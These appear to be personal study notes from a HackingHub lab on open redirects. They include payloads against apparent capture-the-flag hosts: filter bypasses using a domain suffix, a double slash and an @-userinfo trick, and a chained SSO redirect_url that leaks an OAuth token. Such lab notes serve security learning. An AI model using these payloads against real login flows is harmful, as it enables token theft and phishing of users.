# Open Redirect (HackingHub)

https://github.com/payloadbox/open-redirect-payload-list

```html
<a href="/?redirect=http://www.google.com">Google</a>
```

## Bypassing protections

![Pasted image 20241130123503.png](../../assets/images/99ae6bd43d77eb871e6c.png)

```text
?redirect=http://www.google.com.test
```

## SSO Example

![Pasted image 20241130124246.png](../../assets/images/d0248baf2df83fc629f6.png)

![Pasted image 20241130124308.png](../../assets/images/9ac3cf45580c74777807.png)

```text
https://auth.creon.ctfio.com/auth?client_id=1&redirect_url=https://creon.ctfio.com/redirect?url=https://www.google.com&response_type=token
```

## Protections

Regex looking for //
```text
https://auth.icarus.ctfio.com/auth?client_id=1&redirect_url=https://icarus.ctfio.com/x//www.google.com&response_type=token
```

Use the domain before the `@` as a fake username to redirect to the domain after the `@`

```text
https://auth.daedalus.ctfio.com/auth?client_id=1&redirect_url=https://redacted@example.invalid/&response_type=token
```

## XSS

![Pasted image 20241130131636.png](../../assets/images/f8ce2076724a051ad31e.png)
